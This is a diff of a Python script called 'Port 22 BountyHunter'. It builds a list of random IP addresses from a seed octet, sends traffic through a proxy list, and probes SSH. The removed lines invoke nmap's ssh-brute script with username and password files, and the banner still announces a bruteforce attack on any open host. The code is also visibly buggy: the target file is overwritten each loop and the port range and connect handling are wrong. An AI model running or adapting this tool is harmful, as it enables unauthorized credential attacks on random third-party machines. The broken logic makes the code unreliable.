@@ -1,17 +1,16 @@
 import time
-import nmap
 import requests
 import socket
 import random
 import sys
 import subprocess
-import itertools
-import threading
+from colorama import init, Fore, Back, Style
 from datetime import datetime
 
+init(autoreset=False)
 
 subprocess.call('clear', shell=True)
-nm = nmap.PortScanner()
+
 ips = open('targets.txt')
 with open('proxyf.txt', 'r') as f:
     proxy = f.read().splitlines()
@@ -21,82 +20,101 @@ proxies = {
 ############################INTRO ANIMATE######################################
 Corexital = False
 t1 = datetime.now()
-print("CURRENT TIME", t1)
-print('Corexital Data: Port 22 Bounty Hunter Written by Derek Johnston')
-def startintro():
+print(Style.BRIGHT + Back.YELLOW + "STARTED AT: ", str(datetime.now()))
+print("")
 
-    for c in itertools.cycle(['*', '**', '***', '****']):
-        if Corexital:
-            break
-        sys.stdout.write('\rSTARTING ' + c)
-        sys.stdout.flush()
-        time.sleep(0.1)
-
-
-t = threading.Thread(target=startintro)
-t.start()
-
-
-time.sleep(3)
+time.sleep(1)
 Corexital = True
-##########################################################TITLE##############
-def title():
-    print("=========COREXITAL==DATA====================")
-    print("\==============ESTABLISH ANY SECURE SHELL===========/")
-    print("")
-title()
+print("")
+
 
 def print_slow(str):
     for letter in str:
         sys.stdout.write(letter)
         sys.stdout.flush()
-        time.sleep(0.02)
+        time.sleep(0.015)
 
-print_slow("Populate list of targets with seed IP. BountyHunter then finds all open port 22 SSH and executes bruteforce attack")
-print("")
 
+print_slow(Style.BRIGHT + Back.YELLOW + "PORT 22 BOUNTYHUNTER  --   COREXITAL DATA   -- 2023    ")
+print(Style.RESET_ALL + "")
+
+
+##########################################################TITLE##############
+def title():
+    print(Style.BRIGHT + Fore.GREEN + "==============COREXITAL DATA========================")
+    print(Style.BRIGHT + Fore.GREEN + "==============BOUNTY HUNTER v1.2====================")
+    print("")
+    print(Style.BRIGHT + Fore.GREEN + "Written by:    DEREK JOHNSTON")
+    print("")
+
+
+title()
+
+print(
+    Style.BRIGHT + Fore.GREEN + "Populate target list by entering seed IP value. BountyHunter checks to see if port 22 is open.")
+print(Style.BRIGHT + Fore.GREEN + "If port 22 is open BountyHunter will execute a bruteforce attack")
+print(Style.RESET_ALL + "")
 ##################TARGET POPULATION####################################
+tarlist = ('targets.txt')
+seed = input("Enter First Octet (example'192' '172' '10'):   ")
+print("LOADING...")
 
-seed = input("Enter First Octet example- '192' '172' '10':   ")
+
 def make_list():
     for x in range(250):
         octet2 = (random.randrange(255))
         octet3 = (random.randrange(255))
         octet4 = (random.randrange(255))
-        tarlist = ('targets.txt')
-        with open(tarlist, 'w') as tl:
-                ipadd = (seed,'.'+ str(octet2),'.' + str(octet3),'.' + str(octet4).lstrip(' '))
-                tl.writelines(ipadd)
+
+        with open(tarlist, 'w+') as tl:
+            ipadd = (seed, '.' + str(octet2), '.' + str(octet3), '.' + str(octet4).lstrip(' '))
+            tl.writelines(ipadd)
 
 
-make_list()
+for l in range(250):
+    make_list()
+print("INIT...")
+
+
 ##################ENDING LIST POPULATION##########################
 
 def attack():
-    x = ips.readline()
-    print('Scanning:', x)
+    with open(tarlist, 'r') as rl:
+        x = rl.readlines()
+
+    print(Style.BRIGHT + Fore.YELLOW + 'Scanning:', x)
+
+    print(Style.BRIGHT + Fore.GREEN + Back.RED + "AT: " + Style.BRIGHT + Fore.RED + Back.GREEN + "TIMESTAMP",
+          str(datetime.now()))
+    print(Style.RESET_ALL + "")
+    
+
     try:
-        for port in range(22):
+        for port in range(21, 22):
             requests.get(url='https://google.com', proxies=proxies)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            remoteaddr = socket.gethostname()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             socket.setdefaulttimeout(2)
-            result = sock.connect_ex((x, port))
+            result = s.connect((remoteaddr, port))
+        
             if result == 0:
                 print("Port 22:OPEN")
-                subprocess.call('nmap -p 22 --script ssh-brute --script-args userdb=names.txt,passdb=passes.txt')
-            else:
+
+            if result == 1:
                 print("Port 22:CLOSED")
-            sock.close()
+            s.close()
 
     except KeyboardInterrupt:
         print("Cancelled")
         sys.exit()
     except socket.gaierror:
-        print("Host Can't Resolve Man")
+        print("Not Resolving ")
 
     except socket.error:
-        print("Can't Connect Dude")
+        print("its fuked up man")
 
 
 attack()
-print("Attack Stopped At:", t1)
+
+print(Style.RESET_ALL + "Stopping..")
+print(Style.BRIGHT + Fore.RED + "Attack Stopped At:", str(datetime.now()))
